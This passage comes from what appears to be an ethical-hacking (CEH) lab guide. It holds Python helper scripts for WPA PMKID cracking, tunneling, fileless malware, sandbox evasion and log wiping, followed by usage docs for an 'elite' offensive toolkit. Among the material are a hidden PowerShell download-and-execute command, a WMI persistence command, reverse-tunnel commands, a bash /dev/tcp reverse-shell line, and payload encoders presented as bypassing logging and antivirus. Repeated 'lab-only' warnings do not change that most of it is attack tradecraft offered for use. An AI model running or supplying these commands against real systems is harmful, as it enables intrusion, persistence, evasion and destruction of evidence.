        print(f"Error: {e}")

def capture_pmkid():
    print(f"[*] Capturing PMKID from {LAB_TARGET_BSSID}...")
    try:
        subprocess.run(["hcxpcapngtool", "-o", "lab-pmkid.22000", "lab-capture.pcapng"], check=True)
    except Exception as e:
        print(f"Error: {e}")

def crack_pmkid():
    print("[*] Cracking PMKID...")
    try:
        subprocess.run(["hashcat", "-m", "22000", "lab-pmkid.22000", LAB_WORDLIST], check=True)
    except Exception as e:
        print(f"Error: {e}")

def main():
    print("="*80)
    print("LAB-ONLY: WPA3 PMKID Capture & Cracking Helper")
    print("="*80)
    print("Steps (LAB ONLY):")
    print("1. Set interface to monitor mode")
    print("2. Capture PMKID with hcxdumptool")
    print("3. Convert capture to hashcat format")
    print("4. Crack with hashcat")

if __name__ == "__main__":
    main()

```

> [!TIP]
> **Step-by-Step Usage Guide**
> 
> | Step | Action |
> |:-----|:-------|
> | **1. Prerequisites** | Python 3 or appropriate runtime (check script shebang) installed. Required dependencies (like requests, scapy if used). Root/administrator privileges as needed for packet capture, port scanning, etc. |
> | **2. When to use** | During authorized lab-based security assessments, penetration testing practice, or ethical hacking training for the specific technique this script addresses. |
> | **3. Edit configuration** | Open the script and modify the configuration variables at the top (like LAB_TARGET_URL, LAB_TARGET_IP, etc.) to match your lab environment. |
> | **4. Run the script** | Execute the script with appropriate permissions (e.g., `sudo python3 14-wifi-pmkid-helper.py` for packet capture/port scanning, or `./14-wifi-pmkid-helper.py` for shell scripts after `chmod +x`). |
> | **5. Interpret output** | Read the console output carefully; the script is designed to provide clear status updates and results for lab use. |
> | **6. Next step** | Use the information or results from this script to proceed with further lab-based assessment steps, following your training plan or lab guide. |

---

## Section 320 : Obfuscation & Tunneling Helper Script

> [!WARNING]
> ALL CONTENT IN THIS SECTION IS STRICLY LAB-ONLY! DO NOT USE AGAINST ANY SYSTEM YOU DO NOT OWN OR HAVE EXPLICIT WRITTEN PERMISSION TO TEST!

### Custom Automation Script: Obfuscation & Tunneling Helper Script

**Explanation**: This script is designed for use in controlled lab environments as part of authorized security assessments and training. It follows ethical hacking practices and includes safety checks to ensure it only targets private lab IP ranges.

```python
#!/usr/bin/env python3
# LAB-ONLY: Network Traffic Obfuscation & Tunneling Helper
# CEH v13 Ultimate Offensive Script 15
# STRICTLY FOR AUTHORIZED LAB USE ONLY!
import sys

# -------------------------- EDIT THESE VALUES FOR YOUR LAB --------------------------
LAB_ATTACKER = "192.168.100.20"
LAB_VICTIM = "192.168.100.10"
# -----------------------------------------------------------------------------------

def tunnel_options():
    print("="*80)
    print("LAB-ONLY: Network Obfuscation & Tunneling Options")
    print("="*80)
    print("1. SSH Dynamic Port Forwarding (SOCKS proxy)")
    print(f"   ssh -D 9050 -fNq user@{LAB_VICTIM}")
    print("\n2. SSH Remote Port Forwarding")
    print(f"   ssh -R 4444:127.0.0.1:80 user@{LAB_ATTACKER}")
    print("\n3. HTTP Tunneling with chisel")
    print(f"   Attacker: chisel server -p 8080 --reverse")
    print(f"   Victim:   chisel client {LAB_ATTACKER}:8080 R:socks")
    print("\n4. DNS Tunneling with dnscat2")
    print("\n5. ICMP Tunneling with ptunnel-ng")

if __name__ == "__main__":
    tunnel_options()

```

> [!TIP]
> **Step-by-Step Usage Guide**
> 
> | Step | Action |
> |:-----|:-------|
> | **1. Prerequisites** | Python 3 or appropriate runtime (check script shebang) installed. Required dependencies (like requests, scapy if used). Root/administrator privileges as needed for packet capture, port scanning, etc. |
> | **2. When to use** | During authorized lab-based security assessments, penetration testing practice, or ethical hacking training for the specific technique this script addresses. |
> | **3. Edit configuration** | Open the script and modify the configuration variables at the top (like LAB_TARGET_URL, LAB_TARGET_IP, etc.) to match your lab environment. |
> | **4. Run the script** | Execute the script with appropriate permissions (e.g., `sudo python3 15-obfuscation-tunneling.py` for packet capture/port scanning, or `./15-obfuscation-tunneling.py` for shell scripts after `chmod +x`). |
> | **5. Interpret output** | Read the console output carefully; the script is designed to provide clear status updates and results for lab use. |
> | **6. Next step** | Use the information or results from this script to proceed with further lab-based assessment steps, following your training plan or lab guide. |

---

## Section 321 : Fileless Malware Concept Demonstration (LAB ONLY)

> [!WARNING]
> ALL CONTENT IN THIS SECTION IS STRICLY LAB-ONLY! DO NOT USE AGAINST ANY SYSTEM YOU DO NOT OWN OR HAVE EXPLICIT WRITTEN PERMISSION TO TEST!

### Custom Automation Script: Fileless Malware Concept Demonstration (LAB ONLY)

**Explanation**: This script is designed for use in controlled lab environments as part of authorized security assessments and training. It follows ethical hacking practices and includes safety checks to ensure it only targets private lab IP ranges.

```python
#!/usr/bin/env python3
# LAB-ONLY: Fileless Malware Concept Demo
# CEH v13 Ultimate Offensive Script 16
# STRICTLY FOR AUTHORIZED LAB USE ONLY!
# EDUCATIONAL: Demonstrates fileless concepts, NO malicious payload
import sys
import base64

def fileless_concept():
    print("="*80)
    print("LAB-ONLY: Fileless Malware Concept Demo (NO MALICIOUS PAYLOAD)")
    print("="*80)
    print("1. PowerShell Download & Execute (memory-only, LAB ONLY):")
    ps_cmd = 'IEX (New-Object Net.WebClient).DownloadString("http://lab-server/script.ps1")'
    print(f"   [Example command]: powershell -nop -w hidden -c \"{ps_cmd}\"")
    print("\n2. JavaScript in JScript/VBScript:")
    print("   cscript //E:JScript evil.js")
    print("\n3. WMI Event Subscription:")
    print("   wmic /NAMESPACE:\\\\root\\subscription PATH __EventFilter CREATE Name='LabFilter', EventNameSpace='root\\cimv2', QueryLanguage='WQL', Query='SELECT * FROM __InstanceModificationEvent WITHIN 30 WHERE TargetInstance ISA \"Win32_PerfFormattedData_PerfOS_System\"'")
    print("\n4. Reflective DLL Injection concept (LAB ONLY)")
    print("\n> [!WARNING] FOR LAB EDUCATIONAL PURPOSES ONLY!")

if __name__ == "__main__":
    fileless_concept()

```

> [!TIP]
> **Step-by-Step Usage Guide**
> 
> | Step | Action |
> |:-----|:-------|
> | **1. Prerequisites** | Python 3 or appropriate runtime (check script shebang) installed. Required dependencies (like requests, scapy if used). Root/administrator privileges as needed for packet capture, port scanning, etc. |
> | **2. When to use** | During authorized lab-based security assessments, penetration testing practice, or ethical hacking training for the specific technique this script addresses. |
> | **3. Edit configuration** | Open the script and modify the configuration variables at the top (like LAB_TARGET_URL, LAB_TARGET_IP, etc.) to match your lab environment. |
> | **4. Run the script** | Execute the script with appropriate permissions (e.g., `sudo python3 16-fileless-concept-demo.py` for packet capture/port scanning, or `./16-fileless-concept-demo.py` for shell scripts after `chmod +x`). |
> | **5. Interpret output** | Read the console output carefully; the script is designed to provide clear status updates and results for lab use. |
> | **6. Next step** | Use the information or results from this script to proceed with further lab-based assessment steps, following your training plan or lab guide. |

---

## Section 322 : Sandbox Detection & Evasion Checker

> [!WARNING]
> ALL CONTENT IN THIS SECTION IS STRICLY LAB-ONLY! DO NOT USE AGAINST ANY SYSTEM YOU DO NOT OWN OR HAVE EXPLICIT WRITTEN PERMISSION TO TEST!

### Custom Automation Script: Sandbox Detection & Evasion Checker

**Explanation**: This script is designed for use in controlled lab environments as part of authorized security assessments and training. It follows ethical hacking practices and includes safety checks to ensure it only targets private lab IP ranges.

```python
#!/usr/bin/env python3
# LAB-ONLY: Malware Sandbox Evasion Detection Checker
# CEH v13 Ultimate Offensive Script 17
# STRICTLY FOR AUTHORIZED LAB USE ONLY!
import sys
import os
import platform

def sandbox_checks():
    print("="*80)
    print("LAB-ONLY: Sandbox Evasion Checks (Educational)")
    print("="*80)
    checks = [
        ("Number of processors", f"{os.cpu_count()}"),
        ("Total memory (concept)", "Check <4GB for sandbox"),
        ("Uptime", "Check <10 minutes for sandbox"),
        ("Screen resolution", "Check if 800x600"),
        ("MAC address prefix", "Check for VM prefixes"),
        ("Running processes", "Check for analysis tools"),
        ("Filesystem size", "Check <100GB"),
        ("Registry keys (Windows)", "Check for VM keys"),
        ("Presence of debuggers", "Check for debuggers")
    ]
    for name, desc in checks:
        print(f"[*] {name}: {desc}")
    print("\n> [!WARNING] Educational only!")

if __name__ == "__main__":
    sandbox_checks()

```

> [!TIP]
> **Step-by-Step Usage Guide**
> 
> | Step | Action |
> |:-----|:-------|
> | **1. Prerequisites** | Python 3 or appropriate runtime (check script shebang) installed. Required dependencies (like requests, scapy if used). Root/administrator privileges as needed for packet capture, port scanning, etc. |
> | **2. When to use** | During authorized lab-based security assessments, penetration testing practice, or ethical hacking training for the specific technique this script addresses. |
> | **3. Edit configuration** | Open the script and modify the configuration variables at the top (like LAB_TARGET_URL, LAB_TARGET_IP, etc.) to match your lab environment. |
> | **4. Run the script** | Execute the script with appropriate permissions (e.g., `sudo python3 17-sandbox-evasion-checker.py` for packet capture/port scanning, or `./17-sandbox-evasion-checker.py` for shell scripts after `chmod +x`). |
> | **5. Interpret output** | Read the console output carefully; the script is designed to provide clear status updates and results for lab use. |
> | **6. Next step** | Use the information or results from this script to proceed with further lab-based assessment steps, following your training plan or lab guide. |

---

## Section 323 : Software Supply Chain Vulnerability Tester

> [!WARNING]
> ALL CONTENT IN THIS SECTION IS STRICLY LAB-ONLY! DO NOT USE AGAINST ANY SYSTEM YOU DO NOT OWN OR HAVE EXPLICIT WRITTEN PERMISSION TO TEST!

### Custom Automation Script: Software Supply Chain Vulnerability Tester

**Explanation**: This script is designed for use in controlled lab environments as part of authorized security assessments and training. It follows ethical hacking practices and includes safety checks to ensure it only targets private lab IP ranges.

```python
#!/usr/bin/env python3
# LAB-ONLY: Supply Chain Attack Concept Tester
# CEH v13 Ultimate Offensive Script 18
# STRICTLY FOR AUTHORIZED LAB USE ONLY!
import sys
import os

def supply_chain_concepts():
    print("="*80)
    print("LAB-ONLY: Supply Chain Attack Concepts (Educational)")
    print("="*80)
    print("1. Dependency confusion (PyPI/npm)")
    print("2. Typosquatting packages")
    print("3. Malicious pull requests")
    print("4. Compromised build systems")
    print("5. Software update hijacking")
    print("\n[*] LAB TEST IDEAS:")
    print("   - Set up a local PyPI mirror")
    print("   - Test dependency confusion in a safe lab")
    print("   - Use pip's --index-url flag to point to lab mirror")
    print("\n> [!WARNING] For LAB ONLY!")

if __name__ == "__main__":
    supply_chain_concepts()

```

> [!TIP]
> **Step-by-Step Usage Guide**
> 
> | Step | Action |
> |:-----|:-------|
> | **1. Prerequisites** | Python 3 or appropriate runtime (check script shebang) installed. Required dependencies (like requests, scapy if used). Root/administrator privileges as needed for packet capture, port scanning, etc. |
> | **2. When to use** | During authorized lab-based security assessments, penetration testing practice, or ethical hacking training for the specific technique this script addresses. |
> | **3. Edit configuration** | Open the script and modify the configuration variables at the top (like LAB_TARGET_URL, LAB_TARGET_IP, etc.) to match your lab environment. |
> | **4. Run the script** | Execute the script with appropriate permissions (e.g., `sudo python3 18-supply-chain-tester.py` for packet capture/port scanning, or `./18-supply-chain-tester.py` for shell scripts after `chmod +x`). |
> | **5. Interpret output** | Read the console output carefully; the script is designed to provide clear status updates and results for lab use. |
> | **6. Next step** | Use the information or results from this script to proceed with further lab-based assessment steps, following your training plan or lab guide. |

---

## Section 324 : Forensic Wiper Concepts (Educational LAB Use)

> [!WARNING]
> ALL CONTENT IN THIS SECTION IS STRICLY LAB-ONLY! DO NOT USE AGAINST ANY SYSTEM YOU DO NOT OWN OR HAVE EXPLICIT WRITTEN PERMISSION TO TEST!

### Custom Automation Script: Forensic Wiper Concepts (Educational LAB Use)

**Explanation**: This script is designed for use in controlled lab environments as part of authorized security assessments and training. It follows ethical hacking practices and includes safety checks to ensure it only targets private lab IP ranges.

```python
#!/usr/bin/env python3
# LAB-ONLY: Forensic Artifact Wiper (LAB TEST ONLY)
# CEH v13 Ultimate Offensive Script 19
# STRICTLY FOR AUTHORIZED LAB USE ONLY!
# USE ONLY ON YOUR OWN LAB SYSTEMS!
import sys

def lab_wiper_concepts():
    print("="*80)
    print("LAB-ONLY: Forensic Artifact Wiper Concepts (LAB TEST ONLY)")
    print("="*80)
    print("USE ONLY ON YOUR OWN LAB SYSTEMS!")
    print("\n1. Windows artifacts to clear (LAB ONLY):")
    print("   - Event logs (wevtutil cl)")
    print("   - Prefetch files")
    print("   - Recent files")
    print("   - Browser history")
    print("\n2. Linux artifacts to clear (LAB ONLY):")
    print("   - bash_history")
    print("   - syslog")
    print("   - auth.log")
    print("   - /var/log/*")
    print("\n> [!DANGER] FOR LAB USE ONLY ON YOUR OWN SYSTEMS!")

if __name__ == "__main__":
    lab_wiper_concepts()

```

> [!TIP]
> **Step-by-Step Usage Guide**
> 
> | Step | Action |
> |:-----|:-------|
> | **1. Prerequisites** | Python 3 or appropriate runtime (check script shebang) installed. Required dependencies (like requests, scapy if used). Root/administrator privileges as needed for packet capture, port scanning, etc. |
> | **2. When to use** | During authorized lab-based security assessments, penetration testing practice, or ethical hacking training for the specific technique this script addresses. |
> | **3. Edit configuration** | Open the script and modify the configuration variables at the top (like LAB_TARGET_URL, LAB_TARGET_IP, etc.) to match your lab environment. |
> | **4. Run the script** | Execute the script with appropriate permissions (e.g., `sudo python3 19-forensic-wiper-concepts.py` for packet capture/port scanning, or `./19-forensic-wiper-concepts.py` for shell scripts after `chmod +x`). |
> | **5. Interpret output** | Read the console output carefully; the script is designed to provide clear status updates and results for lab use. |
> | **6. Next step** | Use the information or results from this script to proceed with further lab-based assessment steps, following your training plan or lab guide. |

---

## Section 325 : Red Team Engagement & OpSec Planner

> [!WARNING]
> ALL CONTENT IN THIS SECTION IS STRICLY LAB-ONLY! DO NOT USE AGAINST ANY SYSTEM YOU DO NOT OWN OR HAVE EXPLICIT WRITTEN PERMISSION TO TEST!

### Custom Automation Script: Red Team Engagement & OpSec Planner

**Explanation**: This script is designed for use in controlled lab environments as part of authorized security assessments and training. It follows ethical hacking practices and includes safety checks to ensure it only targets private lab IP ranges.

```python
#!/usr/bin/env python3
# LAB-ONLY: Red Team Engagement Planner & Checklist
# CEH v13 Ultimate Offensive Script 20
# STRICTLY FOR AUTHORIZED LAB USE ONLY!
import sys

def red_team_checklist():
    print("="*80)
    print("LAB-ONLY: Red Team Engagement Checklist")
    print("="*80)
    phases = [
        "1. Reconnaissance",
        "2. Initial Compromise",
        "3. Persistence",
        "4. Privilege Escalation",
        "5. Lateral Movement",
        "6. Data Exfiltration",
        "7. Covering Tracks"
    ]
    for phase in phases:
        print(f"\n{phase}:")
        if phase == "1. Reconnaissance":
            print("   - Passive OSINT (subdomains, employees, tech stack)")
            print("   - Active recon (port scanning, service enumeration)")
        elif phase == "2. Initial Compromise":
            print("   - Web exploitation (SQLi, XSS, RCE)")
            print("   - Phishing (email, smishing, vishing)")
            print("   - Exploit public-facing services")
        elif phase == "3. Persistence":
            print("   - Registry keys, scheduled tasks (Windows)")
            print("   - Cron jobs, systemd services (Linux)")
            print("   - Web shells, backdoors")
        elif phase == "4. Privilege Escalation":
            print("   - Kernel exploits")
            print("   - Service misconfigurations")
            print("   - SUID/SGID binaries (Linux)")
        elif phase == "5. Lateral Movement":
            print("   - Pass-the-Hash/Password/Ticket")
            print("   - SMB/WMI/WinRM")
            print("   - RDP, SSH")
        elif phase == "6. Data Exfiltration":
            print("   - HTTP/HTTPS/DNS/ICMP tunneling")
            print("   - Steganography")
        elif phase == "7. Covering Tracks":
            print("   - Clear logs")
            print("   - Timestamp manipulation")
            print("   - Remove tools/artifacts")

if __name__ == "__main__":
    red_team_checklist()

```

> [!TIP]
> **Step-by-Step Usage Guide**
> 
> | Step | Action |
> |:-----|:-------|
> | **1. Prerequisites** | Python 3 or appropriate runtime (check script shebang) installed. Required dependencies (like requests, scapy if used). Root/administrator privileges as needed for packet capture, port scanning, etc. |
> | **2. When to use** | During authorized lab-based security assessments, penetration testing practice, or ethical hacking training for the specific technique this script addresses. |
> | **3. Edit configuration** | Open the script and modify the configuration variables at the top (like LAB_TARGET_URL, LAB_TARGET_IP, etc.) to match your lab environment. |
> | **4. Run the script** | Execute the script with appropriate permissions (e.g., `sudo python3 20-red-team-planner.py` for packet capture/port scanning, or `./20-red-team-planner.py` for shell scripts after `chmod +x`). |
> | **5. Interpret output** | Read the console output carefully; the script is designed to provide clear status updates and results for lab use. |
> | **6. Next step** | Use the information or results from this script to proceed with further lab-based assessment steps, following your training plan or lab guide. |

---

## Section 326 : Web3/Smart Contract Vulnerability Testing Concepts

> [!WARNING]
> ALL CONTENT IN THIS SECTION IS STRICLY LAB-ONLY! DO NOT USE AGAINST ANY SYSTEM YOU DO NOT OWN OR HAVE EXPLICIT WRITTEN PERMISSION TO TEST!

### Custom Automation Script: Web3/Smart Contract Vulnerability Testing Concepts

**Explanation**: This script is designed for use in controlled lab environments as part of authorized security assessments and training. It follows ethical hacking practices and includes safety checks to ensure it only targets private lab IP ranges.

```python
#!/usr/bin/env python3
# LAB-ONLY: Web3/Blockchain Vulnerability Tester (Concepts)
# CEH v13 Ultimate Offensive Script 21
# STRICTLY FOR AUTHORIZED LAB USE ONLY!
import sys

def web3_concepts():
    print("="*80)
    print("LAB-ONLY: Web3/Blockchain Vulnerability Concepts")
    print("="*80)
    vulnerabilities = [
        "1. Reentrancy attacks",
        "2. Integer overflow/underflow",
        "3. Access control issues",
        "4. Front-running attacks",
        "5. Logic bugs in smart contracts",
        "6. Phishing for private keys",
        "7. rug pulls",
        "8. Flash loan attacks"
    ]
    for v in vulnerabilities:
        print(f"  {v}")
    print("\n[*] LAB TEST IDEAS:")
    print("   - Use Remix IDE to test vulnerable contracts")
    print("   - Test on testnets (Ropsten, Goerli, etc.)")
    print("\n> [!WARNING] For LAB EDUCATIONAL PURPOSES ONLY!")

if __name__ == "__main__":
    web3_concepts()

```

> [!TIP]
> **Step-by-Step Usage Guide**
> 
> | Step | Action |
> |:-----|:-------|
> | **1. Prerequisites** | Python 3 or appropriate runtime (check script shebang) installed. Required dependencies (like requests, scapy if used). Root/administrator privileges as needed for packet capture, port scanning, etc. |
> | **2. When to use** | During authorized lab-based security assessments, penetration testing practice, or ethical hacking training for the specific technique this script addresses. |
> | **3. Edit configuration** | Open the script and modify the configuration variables at the top (like LAB_TARGET_URL, LAB_TARGET_IP, etc.) to match your lab environment. |
> | **4. Run the script** | Execute the script with appropriate permissions (e.g., `sudo python3 21-web3-vuln-tester.py` for packet capture/port scanning, or `./21-web3-vuln-tester.py` for shell scripts after `chmod +x`). |
> | **5. Interpret output** | Read the console output carefully; the script is designed to provide clear status updates and results for lab use. |
> | **6. Next step** | Use the information or results from this script to proceed with further lab-based assessment steps, following your training plan or lab guide. |

---

# ⚡ Phase 12: Elite Arsenal — Production-Grade Offensive Tools

> [!IMPORTANT]
> **Phase 12 contains production-grade tools** — these are not demo scripts. They feature multi-threading, CLI argument parsing, JSON reporting, WAF evasion, proxy support, and verification probes. Each tool replaces 5–15 of the earlier single-purpose scripts.

> **📖 Full Usage Guide:** [Elite Arsenal Usage Guide](Elite-Arsenal-Usage-Guide.md)
> **📂 Script Location:** `lab-scripts/elite/`
> **📦 Dependency:** `pip install requests`

---

## Section 327 : Elite Recon Engine — Full-Spectrum Target Reconnaissance

> **File:** `lab-scripts/elite/01-recon-engine.py` (524 lines)
> **Replaces:** Sections 246, 251, 253, 254, 306

### What This Tool Does

The Recon Engine performs **5 reconnaissance phases** in a single execution:

| Phase | Capability | Details |
|-------|-----------|---------|
| 1. Port Scanning | Multi-threaded TCP connect scan | Common (32), Top 1000, or Full 65535 ports with banner grabbing |
| 2. Tech Detection | HTTP header + body fingerprinting | 25+ technologies (Apache, Nginx, IIS, PHP, WordPress, Django, etc.) |
| 3. SSL/TLS Analysis | Certificate & cipher validation | Protocol version, cipher strength, cert hash |
| 4. Subdomain Enum | DNS brute-force | 120+ common subdomains with IP resolution |
| 5. Vuln Checks | Path-based misconfiguration testing | .env, .git, backup.sql, phpMyAdmin, Actuator, etc. |

### Usage

```bash
# Quick scan (common ports)
python3 01-recon-engine.py 192.168.1.1

# Top 1000 ports with 200 threads
python3 01-recon-engine.py 192.168.1.1 -p top1000 -t 200

# Full 65535 port scan
python3 01-recon-engine.py 192.168.1.1 -p full -t 500

# With subdomain enumeration
python3 01-recon-engine.py target.lab -s -t 100

# Save report to file
python3 01-recon-engine.py 10.0.0.1 -o recon-report.json
```

### CLI Flags

| Flag | Description | Default |
|------|-------------|---------|
| `-p` | Port range: `common`, `top1000`, `full` | common |
| `-t` | Thread count | 100 |
| `-T` | Connection timeout (seconds) | 2.0 |
| `-s` | Enable subdomain enumeration | off |
| `-o` | Output JSON file path | auto-generated |
| `--no-color` | Disable colored output | off |

---

## Section 328 : Elite Web Vulnerability Scanner — Multi-Vector Web Exploitation

> **File:** `lab-scripts/elite/02-web-vuln-scanner.py` (437 lines)
> **Replaces:** Sections 247–250, 255, 261–268, 310

### What This Tool Does

Tests web applications for **5 vulnerability classes** with automated verification:

| Vulnerability | Detection Methods | WAF Evasion |
|--------------|-------------------|-------------|
| **SQL Injection** | Boolean-blind, Time-blind (MySQL/MSSQL/PostgreSQL), Error-based (EXTRACTVALUE, double-query), UNION (1–5 columns) | MySQL comments `/*!*/`, case alternation, URL-encoded AND |
| **Cross-Site Scripting** | Script tag, event handlers (onerror, onload, ontoggle), template literals, polyglot | HTML entities, Base64 eval, SVG context |
| **Local File Inclusion** | Path traversal (3+ depths), double-dot bypass, double URL encoding, UTF-8 overlong, PHP wrappers (filter, input, expect, data) | Multiple encoding layers |
| **Command Injection** | Arithmetic markers, backtick, $(cmd), time-based blind | $IFS space bypass, variable concatenation, wildcard globbing |
| **SSRF** | AWS/GCP/Azure metadata, Redis, Elasticsearch, port scanning | Hex IP, octal IP, decimal IP, IPv6 loopback |

### Usage

```bash
# Full auto-scan (discovers parameters automatically)
python3 02-web-vuln-scanner.py http://192.168.1.1/app

# Scan specific parameters
python3 02-web-vuln-scanner.py http://target/page.php --params id,page,file

# Only SQLi and XSS
python3 02-web-vuln-scanner.py http://target/ --scan sqli,xss

# Through Burp Suite proxy
python3 02-web-vuln-scanner.py http://target/ --proxy http://127.0.0.1:8080

# Authenticated scan
python3 02-web-vuln-scanner.py http://target/ --cookie "PHPSESSID=abc123"

# Rate-limited stealth scan
python3 02-web-vuln-scanner.py http://target/ --delay 0.5 --timeout 15
```

### CLI Flags

| Flag | Description | Default |
|------|-------------|---------|
| `--params` | Comma-separated parameters to test | auto-discover |
| `--scan` | Scan types: `sqli,xss,lfi,cmdi,ssrf` | all |
| `--proxy` | Route through HTTP proxy (Burp) | none |
| `--cookie` | Session cookie for authenticated testing | none |
| `--delay` | Delay between requests (seconds) | 0 |
| `--timeout` | Request timeout | 10 |
| `-o` | Output report path | auto-generated |

---

## Section 329 : Elite Privilege Escalation Scanner — Linux & Windows Privesc

> **File:** `lab-scripts/elite/03-privesc-scanner.py` (358 lines)
> **Replaces:** Sections 257–258, 277–278

### What This Tool Does

Run this **on the target system** after gaining initial access. Auto-detects OS and runs all applicable checks:

#### Linux Checks (12)

| Check | What It Finds | Exploit Output |
|-------|---------------|----------------|
| SUID/SGID Binaries | 30+ GTFOBins-mapped dangerous binaries | Ready-to-use exploit commands |
| Sudo Config | NOPASSWD, LD_PRELOAD, dangerous commands | Specific sudo abuse commands |
| Writable Files | /etc/passwd, /etc/shadow, /etc/sudoers | Echo commands to add root user |
| Cron Jobs | Writable cron scripts | Reverse shell injection commands |
| Capabilities | cap_setuid, cap_sys_admin, cap_dac_override | Capability abuse techniques |
| Kernel Version | DirtyCow, DirtyPipe, known CVEs | CVE references |
| Docker/LXD | Docker socket, group membership | Docker escape one-liners |
| Network | Internal-only listening services | Port forwarding commands |
| Credentials | SSH keys, .bash_history, wp-config.php | File locations |

#### Windows Checks (9)

| Check | What It Finds | Exploit Output |
|-------|---------------|----------------|
| Unquoted Service Paths | DLL hijacking opportunities | Path interception locations |
| AlwaysInstallElevated | MSI privilege escalation | msfvenom MSI payload command |
| AutoLogon | Plaintext registry credentials | Registry query |
| Token Privileges | SeImpersonate (Potato), SeBackup, SeDebug | PrintSpoofer/GodPotato commands |
| Stored Credentials | cmdkey saved credentials | runas /savecred command |
| Scheduled Tasks | Writable task binaries | Binary replacement technique |
| Missing Patches | Installed KB enumeration | Cross-reference guidance |
| SAM/SYSTEM | Readable hash files | Hash extraction commands |

### Usage

```bash
# Run on target — auto-detects Linux or Windows
python3 03-privesc-scanner.py
```

---

## Section 330 : Elite Exploit & Shell Framework — Payloads, Encoders & Listeners

> **File:** `lab-scripts/elite/04-exploit-framework.py` (282 lines)
> **Replaces:** Sections 282–283, 284, 285, 286, 300

### What This Tool Does

Three capabilities in one tool:

#### 1. Shell Generator (22 payloads)

| Category | Shells |
|----------|--------|
| **Linux Reverse** | Bash TCP, Bash UDP, Netcat (classic + mkfifo), Python3, Python3 PTY (fully interactive), Perl, Ruby, Node.js, Socat TLS |
| **Windows Reverse** | PowerShell (plain + Base64 encoded), Python Windows |
| **Web Server Reverse** | PHP exec, PHP proc_open, Java Runtime |
| **Web Shells** | PHP one-liner, PHP obfuscated (str_rot13), JSP, ASPX |

#### 2. Payload Encoder (5 methods)

| Method | Technique | Evasion Level |
|--------|-----------|---------------|
| `base64` | `echo B64 \| base64 -d \| bash` | Basic |
| `hex` | `echo HEX \| xxd -r -p \| bash` | Moderate |
| `url` | URL encoding | Web context |
| `powershell-b64` | UTF-16LE Base64 with `-enc` flag | Windows AV |
| `python-exec` | `python3 -c 'import base64...'` | Cross-platform |

#### 3. Reverse Shell Listener

Built-in TCP listener with interactive shell session.

### Usage

```bash
# Generate ALL shell payloads
python3 04-exploit-framework.py generate -H 192.168.1.100 -P 4444

# Generate specific shell type
python3 04-exploit-framework.py generate -H 10.0.0.1 -P 443 -t python3-pty

# Encode a payload
python3 04-exploit-framework.py encode -p "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1" -m base64

# PowerShell encoding (bypasses logging)
python3 04-exploit-framework.py encode -p "IEX(cmd)" -m powershell-b64

# Start a listener
python3 04-exploit-framework.py listen -P 4444

# List all available shell types
python3 04-exploit-framework.py list
```

---

## Section 331 : Elite Directory & Endpoint Fuzzer — Content Discovery Engine

> **File:** `lab-scripts/elite/05-dir-fuzzer.py` (287 lines)
> **Replaces:** Sections 253, 254, 270

### What This Tool Does

Multi-threaded web content discovery with:
- **200+ built-in paths** covering admin panels, configs, backups, APIs, debug endpoints
- **Extension brute-forcing** (.php, .html, .bak, .old, .json, .sql, etc.)
- **Smart false-positive filtering** via baseline response comparison
- **Recursive directory scanning** of discovered paths
- **API endpoint wordlist** for modern applications

### Usage

```bash
# Quick scan with built-in wordlist
python3 05-dir-fuzzer.py http://192.168.1.1/

# Use external wordlist (SecLists)
python3 05-dir-fuzzer.py http://target/ -w /usr/share/seclists/Discovery/Web-Content/common.txt

# API endpoint fuzzing
python3 05-dir-fuzzer.py http://target/ -b api -t 50

# Custom extensions
python3 05-dir-fuzzer.py http://target/ -e .php,.html,.bak,.old,.swp

# Recursive mode
python3 05-dir-fuzzer.py http://target/ -r -t 50

# Through Burp proxy
python3 05-dir-fuzzer.py http://target/ --proxy http://127.0.0.1:8080

# Hide 403/301 responses
python3 05-dir-fuzzer.py http://target/ --hide-status 403,301

# Rate-limited stealth scan
python3 05-dir-fuzzer.py http://target/ --delay 1 -t 5
```

### CLI Flags

| Flag | Description | Default |
|------|-------------|---------|
| `-w` | Custom wordlist file path | built-in |
| `-b` | Built-in wordlist: `common`, `api` | common |
| `-e` | Extensions (e.g., `.php,.html,.bak`) | .php,.html,.txt,.bak,.json |
| `-t` | Thread count | 30 |
| `-r` | Recursive scanning of discovered dirs | off |
| `--proxy` | HTTP proxy | none |
| `--cookie` | Session cookie | none |
| `--status-filter` | Only show these status codes | all |
| `--hide-status` | Hide specific status codes | none |
| `--hide-size` | Hide responses with specific sizes | none |

---

## ⚡ Elite Arsenal Attack Workflow

Use the tools in sequence for a complete penetration test:

```
┌─────────────────────────────────────────────────────────────┐
│  PHASE 1: RECONNAISSANCE                                    │
│  01-recon-engine.py        → Ports, services, technologies  │
│  05-dir-fuzzer.py          → Hidden endpoints & files       │
├─────────────────────────────────────────────────────────────┤
│  PHASE 2: VULNERABILITY ASSESSMENT                          │
│  02-web-vuln-scanner.py    → SQLi, XSS, LFI, CMDi, SSRF   │
├─────────────────────────────────────────────────────────────┤
│  PHASE 3: EXPLOITATION                                      │
│  04-exploit-framework.py   → Generate shell payload         │
│  04-exploit-framework.py   → Start listener, catch shell    │
├─────────────────────────────────────────────────────────────┤
│  PHASE 4: PRIVILEGE ESCALATION                              │
│  03-privesc-scanner.py     → Find privesc vectors           │
├─────────────────────────────────────────────────────────────┤
│  PHASE 5: POST-EXPLOITATION                                 │
│  07-persistence-kit.py     → Establish persistence          │
│  08-exfil-tester.py        → Test data exfil channels       │
│  06-exploit-chain-gen.py   → Map next attack paths          │
└─────────────────────────────────────────────────────────────┘
```

